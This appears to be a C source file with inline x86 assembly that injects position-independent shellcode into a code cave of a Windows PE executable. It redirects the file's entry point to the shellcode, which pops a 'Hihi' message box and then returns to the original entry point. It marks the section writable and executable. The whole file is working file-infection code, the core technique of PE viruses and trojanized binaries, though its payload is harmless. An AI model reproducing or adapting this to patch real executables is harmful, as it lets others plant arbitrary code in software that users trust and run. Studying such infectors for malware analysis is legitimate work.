#include <stdio.h>
#include <string.h>
#include <windows.h>

#define db(x) __asm _emit x
#define p2align(x, align) (((x+align-1)/align)*align)

__declspec(naked) void shellstart() {
	_asm {
		pushad
		call hmmm
		hmmm:
			mov [esp - 8], esi		
			pop ebp
			sub ebp, offset hmmm
			push esi
		getkernel32:
			xor ecx, ecx
			mov eax, fs : [ecx + 0x30]
			mov eax, [eax + 0x0c]
			mov esi, [eax + 0x14]
			lodsd
			xchg esi, eax
			lodsd
			mov ebx, [eax + 0x10]
		getAddressofName:
			mov edx, [ebx + 0x3c]
			add edx, ebx
			mov edx, [edx + 0x78]
			add edx, ebx
			mov esi, [edx + 0x20]
			add esi, ebx
			xor ecx, ecx
			getProcAddress :
			inc ecx
			lodsd
			add eax, ebx
			cmp[eax], 0x50746547
			jnz getProcAddress
			cmp[eax + 0x4], 0x41636F72
			jnz getProcAddress
			cmp[eax + 0x8], 0x65726464
			jnz getProcAddress

			getProcAddressFunc :
		mov esi, [edx + 0x24]
			add esi, ebx
			mov cx, [esi + ecx * 2]
			dec ecx
			mov esi, [edx + 0x1c]
			add esi, ebx
			mov edx, [esi + ecx * 4]
			add edx, ebx
			mov ebp, edx
			getLoadLibraryA :
		xor ecx, ecx
			push ecx
			push 0x41797261
			push 0x7262694c
			push 0x64616f4c
			push esp
			push ebx
			call edx
			getUser32 :
		push 0x61616c6c
			sub [esp + 0x2], 0x6161
			push 0x642e3233
			push 0x72657355
			push esp
			call eax
			getMessageBox :
		push 0x6141786f
			sub [esp + 0x3], 0x61
			push 0x42656761
			push 0x7373654d
			push esp
			push eax
			call ebp
		MessageBoxA:
			add esp, 0x10
			xor edx, edx
			xor ecx, ecx
			push edx
			push 'ihiH'
			mov edi, esp
			push edx
			push 'ihiH'
			mov ecx, esp
			push edx
			push edi
			push ecx
			push edx
			call eax		
		OEP:
			xor eax, eax
			xor ecx, ecx
			mov eax, fs : [ecx + 0x30]
			mov eax, [eax + 0x08]
			add eax, 0xDDDDDDDD
			mov [esp + 0x54], eax
			mov [esp + 0x28], eax
			popad
			mov eax,[esp + 0x34]
			mov esi, eax
			push eax			
			ret			
	}
	
}

void shellend() {}

int main(int argc, char* argv[])
{
	DWORD start = (DWORD)shellstart;
	printf("Start value %08X \n", start);
	DWORD end = (DWORD)shellend;
	/*PVOID a;
	ReadProcessMemory(GetCurrentProcess(), (PVOID)(start + 1), &a, sizeof(PVOID), 0);*/
	DWORD shellsize =  end - start;
	printf("End value %08X \n", shellsize);
	//start = start + 5 + (UINT)a;

	/*char path[MAX_PATH];
	GetFullPathNameA("notepad++.exe", MAX_PATH, (LPSTR)path, NULL);
	*/
	HANDLE file = CreateFileA(argv[1], FILE_READ_ACCESS | FILE_WRITE_ACCESS, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	
	DWORD dwFileSize = GetFileSize(file, NULL);

	HANDLE hMapping = CreateFileMapping(file, NULL, PAGE_READWRITE, 0, dwFileSize, NULL);

	
	LPBYTE filedata = (LPBYTE)MapViewOfFile(hMapping, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, dwFileSize);
	
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)filedata;
	PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((LPBYTE)filedata + dosHeader->e_lfanew);
	
	DWORD count = 0;
	DWORD shelladdress = 0;
	PIMAGE_SECTION_HEADER sectionHeader = NULL;

	DWORD OEP = ntHeader->OptionalHeader.AddressOfEntryPoint;
	printf("Old original entry point: 0x%08X \n", OEP);
	for (int i = ntHeader->FileHeader.NumberOfSections - 1; i > 0; i--) {
		sectionHeader = (PIMAGE_SECTION_HEADER)((LPBYTE)filedata + dosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
		count = 0;
		shelladdress = 0;
		for (shelladdress = sectionHeader->PointerToRawData; shelladdress < sectionHeader->PointerToRawData + sectionHeader->SizeOfRawData; shelladdress++) {
			if (*(filedata + shelladdress) == 0x00) {
				if (count++ == shellsize) {
					shelladdress -= shellsize;
					break;
				}
			}
			else {
				count = 0;
			}
		}
		if (count - 1  == shellsize) break;
	}
	if (count == 0 || shelladdress == 0) {
		return 1;
	}

	/*HMODULE hModule = LoadLibraryA("user32.dll");
	LPVOID messAddress = GetProcAddress(hModule, "MessageBoxA");*/
	LPVOID lpHeap = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, shellsize);
	memcpy(lpHeap, (LPVOID)start, shellsize);

	//printf("Address MessageBoxA: 0x%08x \n", lpHeap);

	DWORD i = 0;
	//for (; i < shellsize; i++) {
	//	if (*((LPBYTE)lpHeap + i) == 0xAA) {
	//		//*((LPDWORD)lpHeap + i/4) = (DWORD)messAddress;
	//		*(LPDWORD)((DWORD)lpHeap + i) = (DWORD)messAddress;
	//		//memcpy((LPVOID)((DWORD)lpHeap + i), (LPVOID)messAddress, sizeof(D));
	//		i+=3;
	//		FreeLibrary(hModule);
	//		break;
	//	}
	//}
	ntHeader->OptionalHeader.AddressOfEntryPoint = shelladdress + sectionHeader->VirtualAddress - sectionHeader->PointerToRawData;
	printf("New original entry point: 0x%08X \n", ntHeader->OptionalHeader.AddressOfEntryPoint);
	/*for (; i < shellsize; i++) {
		if (*((LPBYTE)lpHeap + i) == 0xDD) {
			*(LPDWORD)((DWORD)lpHeap + i) = (DWORD)ntHeader->OptionalHeader.AddressOfEntryPoint;
			break;
		}
	}*/
	for (; i < shellsize; i++) {
		if (*((LPBYTE)lpHeap + i) == 0xDD) {
			*(LPDWORD)((DWORD)lpHeap + i) = (DWORD)OEP;
			i += 3;
			break;
		}
	}

	memcpy((LPBYTE)(filedata + shelladdress), lpHeap, shellsize);
	sectionHeader->Misc.VirtualSize += shellsize;
	sectionHeader->Characteristics |= IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE;
	//ntHeader->OptionalHeader.AddressOfEntryPoint = shelladdress + sectionHeader->VirtualAddress - sectionHeader->PointerToRawData; 
	return 0;
}